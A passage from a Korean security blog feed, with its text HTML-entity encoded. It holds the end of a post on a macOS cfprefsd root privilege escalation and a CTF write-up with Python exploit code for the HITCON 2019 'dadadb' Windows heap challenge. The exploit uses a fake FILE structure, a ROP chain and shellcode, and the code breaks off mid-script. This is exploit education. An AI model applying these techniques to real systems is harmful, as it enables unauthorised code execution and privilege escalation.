&#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xAE30;&#xBCF8; &#xC124;&#xC815;&#xC744; &#xB2F4;&#xB2F9;&#xD558;&#xB294; <code>cfprefsd</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC124;&#xC815;&#xC744; &#xD558;&#xAE30; &#xC704;&#xD574; &#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC640; &#xC2DC;&#xC2A4;&#xD15C; &#xC804;&#xBC18;&#xC801;&#xC778; &#xC124;&#xC815;&#xC744; &#xC704;&#xD574; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xB450; &#xAC1C;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB450; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB450; <a href="https://developer.apple.com/documentation/xpc">XPC &#xC5F0;&#xACB0;</a>&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>CFPrefsCreatePreferencesDirectory</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <code>cfprefsd</code> &#xB370;&#xBAAC;&#xC5D0;&#xC11C; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xC790; &#xC9C0;&#xC815; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xB54C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xC758; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xB9C9;&#xC74C;&#xC73C;&#xB85C;&#xC368; &#xC784;&#xC758; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC758; &#xC18C;&#xC720;&#xAD8C; &#xC218;&#xC815;&#xC744; &#xB9C9;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC5EC;&#xC804;&#xD788; &#xC0AC;&#xC6A9;&#xC790;&#xB098; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. MacOS&#xB294; &#xC720;&#xC9C0; &#xAD00;&#xB9AC;&#xB97C; &#xC704;&#xD574; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC8FC;&#xAE30;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; <code>/etc/defaults/periodic.conf</code>&#xC5D0; &#xC815;&#xC758;&#xB418;&#xC9C0;&#xB9CC; &#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xC758; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB294; <code>/usr/local/etc/periodic</code>&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xD574;&#xB2F9; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB294; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; <code>cfprefsd</code>&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xD574;&#xCEE4;&#xC758; &#xC18C;&#xC720;&#xB85C; &#xC0DD;&#xC131;&#xD55C; &#xD6C4; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xBA74; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>apple</tag>
      
      <tag>idioth</tag>
      
      <tag>macOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 5 - HITCON 2019 dadadb(2)</title>
    <link href="/2021/05/09/l0ch/pwncoolsexy-part5/"/>
    <url>/2021/05/09/l0ch/pwncoolsexy-part5/</url>
    
    <content type="html"><![CDATA[<h2 id="&#xC774;&#xC804;-&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC774;&#xC804;-&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC774;&#xC804; &#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC774;&#xC804; &#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h2><p><a href="https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/">Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30; Part 1 - pwntools for windows</a></p><p><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/">Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30; Part 2 - NT Heap</a></p><p><a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/">Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30; Part 3 - NT Heap(2)</a></p><p><a href="https://hackyboiz.github.io/2021/04/18/l0ch/pwncoolsexy-part4/">Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30; Part 4 - HITCON 2019 dadadb</a></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; L0ch&#xC785;&#xB2C8;&#xB2E4;! &#xC624;&#xB298; &#xB4DC;&#xB514;&#xC5B4; &#xC2DC;&#xB9AC;&#xC988; &#xB9C8;&#xC9C0;&#xB9C9; &#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC774;&#xC804; &#xAE00;&#xC5D0;&#xC11C; heap overflow - LFH reuse attack&#xC73C;&#xB85C; &#xC775;&#xC2A4;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xC8FC;&#xC18C;&#xB4E4;&#xC744; leak &#xD588;&#xC73C;&#xB2C8; &#xC774;&#xC81C; &#xB0A8;&#xC740; &#xAC74; &#xC775;&#xC2A4;&#xBFD0;&#xC785;&#xB2C8;&#xB2E4;! &#xC775;&#xC2A4; &#xD558;&#xB824;&#xBA74; &#xAC08; &#xAE38;&#xC774; &#xBA38;&#xB2C8; &#xBC14;&#xB85C; &#xBCF8;&#xB860;&#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Exploit-scenario"><a href="#Exploit-scenario" class="headerlink" title="Exploit scenario"></a>Exploit scenario</h1><p>&#xB85C;&#xADF8;&#xC778; &#xCCB4;&#xD06C;&#xB97C; &#xD558;&#xB294; <code>sub_10D0</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; user&#xC640; password&#xB97C; &#xBC1B;&#xACE0; <code>user.txt</code> &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4; &#xBE44;&#xAD50;&#xD55C; &#xB4A4; &#xB85C;&#xADF8;&#xC778; &#xC131;&#xACF5; &#xD639;&#xC740; &#xC2E4;&#xD328;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled.png" alt="pwncoolsexy-part5/Untitled.png"></p><p>&#xC785;&#xB825;&#xD55C; user&#xC640; password&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xB294; bss &#xC601;&#xC5ED;&#xC744; &#xBCF4;&#xBA74; <code>input_pw+0x20</code> &#xC704;&#xCE58;&#xC5D0; &#xD30C;&#xC77C; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB124;&#xC694;!</p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%204.png" alt="pwncoolsexy-part5/Untitled 4.png"></p><p>&#xADF8;&#xB7F0;&#xB370; user&#xC640; password&#xB97C; &#xC785;&#xB825;&#xBC1B;&#xC744; &#xB54C; <code>0x20</code> &#xB9CC;&#xD07C; &#xC785;&#xB825;&#xBC1B;&#xB124;&#xC694;. &#xADF8;&#xB7FC; &#xD30C;&#xC77C; &#xD3EC;&#xC778;&#xD130;&#xB97C; overwrite &#xD560; &#xC218; &#xC788;&#xACA0;&#xC8E0;? &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; fake file structure&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xBA74; arbitrary write&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB300;&#xB7B5;&#xC801;&#xC778; exploit &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>heap overflow&#xB85C; bss &#xC601;&#xC5ED;&#xC5D0; fake chunk &#xC0DD;&#xC131;</li><li>fake chunk&#xC5D0; fake file structure &#xAD6C;&#xC131;</li><li>&#xD30C;&#xC77C; &#xD3EC;&#xC778;&#xD130;&#xAC00; fake file structure&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB3C4;&#xB85D; overwrite</li><li>arbitrary write&#xB85C; return address&#xB97C; rop chain &#xC8FC;&#xC18C;&#xB85C; overwrite</li><li>GET FLAG!!</li></ol><p>&#xC774;&#xC81C; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB300;&#xB85C; &#xD558;&#xB098;&#xC529; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h1 id="Control-RIP"><a href="#Control-RIP" class="headerlink" title="Control RIP"></a>Control RIP</h1><p>NT heap&#xC740; &#xAC19;&#xC740; &#xD06C;&#xAE30;&#xC758; &#xD574;&#xC81C;&#xB41C; chunk&#xB97C; <code>ListHints</code>&#xC5D0;&#xC11C; double linked list&#xB85C; &#xAD00;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xC81C;&#xB41C; chunk&#xC758; data &#xC704;&#xCE58;&#xC5D0;&#xB294; <code>fd</code> &#xC640; <code>bk</code> &#xAC00; &#xC800;&#xC7A5;&#xB418;&#xACE0; &#xAC01;&#xAC01; &#xC774;&#xC804; chunk, &#xB2E4;&#xC74C; chunk&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xBA70; &#xC774;&#xD6C4;&#xC5D0; &#xAC19;&#xC740; &#xD06C;&#xAE30;&#xB85C; &#xC7AC; &#xD560;&#xB2F9;&#xD560; &#xB54C; <code>ListHints</code>&#xB97C; &#xCC38;&#xC870;&#xD574; &#xBA3C;&#xC800; &#xD574;&#xC81C;&#xB41C; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>A~D</code>&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; <code>B</code>&#xC640; <code>D</code>&#xB97C; &#xD574;&#xC81C;&#xD55C; &#xB4A4;&#xC758; &#xC0C1;&#xD669;&#xC744; &#xADF8;&#xB9BC;&#xC73C;&#xB85C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xB098;&#xD0C0;&#xB0B4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9AC;&#xB205;&#xC2A4;&#xC758; Heap &#xAD00;&#xB9AC;&#xB791; &#xBE44;&#xC2B7;&#xD55C; &#xBA74;&#xC774; &#xC788;&#xB124;&#xC694;. </p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%205.png" alt="pwncoolsexy-part5/Untitled%205.png"></p><p><code>A chunk</code>&#xC5D0;&#xC11C; heap overflow&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xBA74; &#xD574;&#xC81C;&#xB41C; <code>B chunk</code>&#xC758; &#xC8FC;&#xC18C;&#xC640; <code>header</code>&#xB97C; leak&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs php">add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x440</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)add(<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;BBBB&quot;</span>)add(<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;CCCC&quot;</span>)add(<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;DDDD&quot;</span>)delete(<span class="hljs-string">&quot;B&quot;</span>)delete(<span class="hljs-string">&quot;D&quot;</span>)<span class="hljs-comment"># leak B - header, fd, bk, chunk address</span>view(<span class="hljs-string">&apos;A&apos;</span>)p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)p.recv(<span class="hljs-number">0x108</span>)header = u64(p.recv(<span class="hljs-number">8</span>))B_fd = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment"># B_fd = D chunk address</span>B_bk = u64(p.recv(<span class="hljs-number">8</span>))p.recv(<span class="hljs-number">0x210</span>)D_fd = u64(p.recv(<span class="hljs-number">8</span>))D_bk = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment"># D_bk = B chunk address</span></code></pre><p>&#xC774;&#xC81C; <code>user</code>&#xC640; <code>pwd</code> &#xC704;&#xCE58;&#xC5D0; 2&#xAC1C;&#xC758; fake chunk&#xB97C; &#xB9CC;&#xB4DC;&#xB294;&#xB370;, leak &#xD55C; <code>B chunk</code> &#xC8FC;&#xC18C;&#xC640; <code>header</code>&#xB97C; &#xC774;&#xC6A9;&#xD574; <code>B chunk</code>&#xC640; &#xC5F0;&#xACB0;&#xB418;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xAC01;&#xAC01;&#xC758; fake chunk&#xC758; header&#xC5D0; &#xAE30;&#xC874; user&#xC640; password&#xB97C; &#xD3EC;&#xD568;&#xD574;&#xC57C; &#xB85C;&#xADF8;&#xC778; &#xCCB4;&#xD06C; &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xACFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  <code>B chunk</code>&#xC758; <code>fd</code>&#xC5D0;&#xB294; &#xC6B0;&#xB9AC;&#xAC00; &#xB9CC;&#xB4E0; fake chunk&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB3C4;&#xB85D; overwrite &#xD558;&#xBA74; &#xB418;&#xACA0;&#xB124;&#xC694;.</p><pre><code class="hljs php">user = imagebase + <span class="hljs-number">0x5620</span>pwd = imagebase + <span class="hljs-number">0x5648</span><span class="hljs-comment"># we make heap </span><span class="hljs-comment"># B -&gt; fake_chunk(pwd) -&gt; fake_chunk(user) -&gt; D</span><span class="hljs-comment"># overwrite B_fd </span><span class="hljs-comment"># B -&gt; fake_chunk(pwd)</span>add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0</span>) + p64(header) + p64(pwd + <span class="hljs-number">0x10</span>))<span class="hljs-comment"># logout</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<span class="hljs-comment"># header</span>fake_pwd = <span class="hljs-string">&quot;phdphd&quot;</span> + <span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">2</span> + p64(header)<span class="hljs-comment"># fd, bk</span>fake_pwd += p64(user + <span class="hljs-number">0x10</span>) + p64(D_bk)[:<span class="hljs-number">-2</span>]<span class="hljs-comment"># header</span>fake_user = <span class="hljs-string">&quot;ddaa&quot;</span> + <span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">4</span> + p64(header)<span class="hljs-comment"># fd, bk</span>fake_user += p64(D_fd) + p64(pwd + <span class="hljs-number">0x10</span>)[:<span class="hljs-number">-2</span>]login(fake_user, fake_pwd)</code></pre><p>&#xD604;&#xC7AC; free&#xB41C; chunk&#xB4E4;&#xC758; double linked list&#xB294; &#xC544;&#xB798; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%206.png" alt="pwncoolsexy-part5/Untitled%206.png"></p><p>&#xB2E4;&#xC74C;&#xC740; <code>B chunk</code>&#xC5D0; fake file structure&#xB97C; &#xAD6C;&#xC131;&#xD560; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. File Structure&#xC5D0; &#xB300;&#xD55C; &#xC790;&#xC138;&#xD55C; &#xB0B4;&#xC6A9;&#xC740; <a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">Play with File Structure</a> &#xC2AC;&#xB77C;&#xC774;&#xB4DC;&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xBA74; &#xB418;&#xBA70; <code>_base</code> &#xD544;&#xB4DC;&#xC5D0; &#xC784;&#xC758;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC4F0;&#xB294; &#xAC83;&#xC73C;&#xB85C; arbitrary write&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>_base</code>&#xC5D0; return address&#xB97C; &#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs php">cnt = <span class="hljs-number">0</span>_ptr = <span class="hljs-number">0</span>_base = retflag = <span class="hljs-number">0x2080</span>fd = <span class="hljs-number">0</span>bufsize = <span class="hljs-number">0x110</span>obj = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag)obj += p32(fd) + p32(<span class="hljs-number">0</span>) + p64(bufsize) +p64(<span class="hljs-number">0</span>)obj += p64(<span class="hljs-number">0xffffffffffffffff</span>) + p32(<span class="hljs-number">0xffffffff</span>) + p32(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span></code></pre><p>return address&#xC5D0;&#xB294; stack base&#xC5D0;&#xC11C; <code>call &lt;func&gt;</code> &#xB2E4;&#xC74C; instruction&#xC774; &#xB4E4;&#xC5B4;&#xAC00;&#xBBC0;&#xB85C; <code>write</code> &#xD568;&#xC218; &#xD638;&#xCD9C; &#xC9C1;&#xD6C4; instruction&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xBA74;&#xC11C; &#xCC3E;&#xC73C;&#xBA74; &#xC27D;&#xAC8C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs php">ret_ins = imagebase+<span class="hljs-number">0x1b60</span>  ret = stack+<span class="hljs-number">0x2500</span><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<span class="hljs-keyword">if</span>(readmem(key,ret) == ret_ins):<span class="hljs-keyword">break</span>ret += <span class="hljs-number">8</span></code></pre><p>&#xC774;&#xC81C; &#xD574;&#xC81C;&#xD55C; <code>B chunk</code>&#xB97C; &#xC7AC;&#xD560;&#xB2F9;&#xD574; <code>B</code>&#xC5D0; fake file structure&#xB97C; &#xC4F4; &#xD6C4; &#xD55C;&#xBC88; &#xB354; &#xD560;&#xB2F9;&#xD558;&#xBA74; &#xC6B0;&#xB9AC;&#xAC00; &#xB9CC;&#xB4E0; fake chunk&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xB294;&#xB370;, <code>pwd+0x20</code> &#xC5D0; &#xD30C;&#xC77C; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC788;&#xC5C8;&#xC73C;&#xB2C8; header &#xD06C;&#xAE30; 16 bytes&#xB97C; &#xC81C;&#xC678;&#xD55C; 16&#xB9CC;&#xD07C; dummy&#xB97C; &#xCC44;&#xC6B0;&#xACE0; <code>B chunk</code>&#xC758; &#xC8FC;&#xC18C;&#xB85C; &#xD30C;&#xC77C; &#xD3EC;&#xC778;&#xD130;&#xB97C; overwrite &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs php">add(<span class="hljs-string">&quot;B_REALLOC&quot;</span>,<span class="hljs-number">0x100</span>, obj)<span class="hljs-comment"># file structure</span>add(<span class="hljs-string">&quot;PWD_CHUNK&quot;</span>,<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;F&quot;</span>*<span class="hljs-number">0x10</span>+p64(D_bk)) <span class="hljs-comment">#overwrite fp to chunk B</span></code></pre><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>&#xC774;&#xC81C; &#xB0A8;&#xC740; &#xAC74; rop chain&#xC744; &#xAD6C;&#xC131;&#xD574;&#xC11C; <code>flag.txt</code>&#xC758; &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xAC00;&#xC838;&#xC640; &#xCD9C;&#xB825;&#xD558;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;! </p><ul><li><p><code>readfile</code>&#xC744; &#xD638;&#xCD9C;&#xD574; shellcode &#xC785;&#xB825;</p><ul><li><p><code>stdin</code>, <code>stdout</code>&#xC740;  <code>peb+0x20</code>&#xC5D0; &#xC704;&#xCE58;&#xD55C; <code>ProcessParameter</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xC11C; leak</p><pre><code class="hljs python">process_parameter = readmem(key, peb+<span class="hljs-number">0x20</span>)stdin = readmem(key, process_parameter+<span class="hljs-number">0x20</span>)stdout = readmem(key, process_parameter+<span class="hljs-number">0x28</span>)</code></pre></li></ul></li><li><p><code>virtualprotect</code>&#xB85C; shellcode &#xC8FC;&#xC18C;&#xC758; &#xC2E4;&#xD589; &#xAD8C;&#xD55C; &#xD5C8;&#xC6A9; &#xD6C4; shellcode&#xB85C; jump</p></li><li><p>shellcode&#xB294; <code>flag.txt</code>&#xB97C; &#xC77D;&#xC5B4; stdout&#xC73C;&#xB85C; &#xCD9C;&#xB825;</p></li></ul><p>&#xD544;&#xC694;&#xD55C; gadget&#xC740; <a href="http://ropshell.com/search">http://ropshell.com</a> &#xC5D0; &#xC775;&#xC2A4; &#xD658;&#xACBD;&#xC758; <code>ntdll.dll</code>&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD574; &#xCC3E;&#xC73C;&#xBA74; &#xB418;&#xBA70;<code>virtualprotect</code>, <code>readfile</code>, <code>writefile</code>, <code>createfile</code> &#xB294; <code>kernel32.dll</code>&#xC5D0;&#xC11C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798;&#xB294; &#xC804;&#xCCB4; <code>exploit.py</code> &#xC785;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> time<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>(<span class="hljs-params">id,pw</span>):</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;User:&quot;</span>)p.sendline(id)p.recvuntil(<span class="hljs-string">&quot;Password:&quot;</span>)p.sendline(pw)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">key, size, data</span>):</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;Key:&quot;</span>)p.sendline(key)p.recvuntil(<span class="hljs-string">&quot;Size:&quot;</span>)p.sendline(str(size))p.recvuntil(<span class="hljs-string">&quot;Data&quot;</span>)p.send(data)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">view</span>(<span class="hljs-params">key</span>):</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;2&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;Key:&quot;</span>)p.sendline(key)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">key</span>):</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;3&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;Key:&quot;</span>)p.sendline(key)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">readmem</span>(<span class="hljs-params">key, addr</span>):</span>add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&apos;a&apos;</span>*<span class="hljs-number">0x70</span> + p64(addr))view(key)p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)<span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">8</span>))context.arch = <span class="hljs-string">&quot;amd64&quot;</span><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span>p = process(<span class="hljs-string">&quot;./dadadb.exe&quot;</span>)login(<span class="hljs-string">&quot;ddaa&quot;</span>,<span class="hljs-string">&quot;phdphd&quot;</span>)<span class="hljs-comment">## enable LFH</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">18</span>):add(<span class="hljs-string">&quot;l0ch&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x90</span>)<span class="hljs-comment">## fill userblock</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">17</span>):add(<span class="hljs-string">&quot;LFH&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x90</span>)delete(<span class="hljs-string">&quot;LFH5&quot;</span>)add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>, <span class="hljs-string">&apos;a&apos;</span>*<span class="hljs-number">0x70</span>)view(<span class="hljs-string">&quot;LFH4&quot;</span>)<span class="hljs-comment">#leak heap base</span>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x70</span>)heap_base = u64(p.recv(<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xffffffffffff0000</span><span class="hljs-comment">#leak next chunk key</span>p.recvuntil(p64(<span class="hljs-number">0x90</span>))key = p.recvuntil(<span class="hljs-string">&quot;\x00&quot;</span>)[:<span class="hljs-number">-1</span>]<span class="hljs-comment">#leak ntdll, imagebase, kernel32 base, stack</span>Lock = readmem(key, heap_base+<span class="hljs-number">0x2c0</span>) <span class="hljs-comment"># _HEAP-&gt;LockVariable-&gt;Lock</span>ntdll = Lock - <span class="hljs-number">0x163dd0</span>pebldr = ntdll + <span class="hljs-number">0x1653c0</span>IMOML = readmem(key, 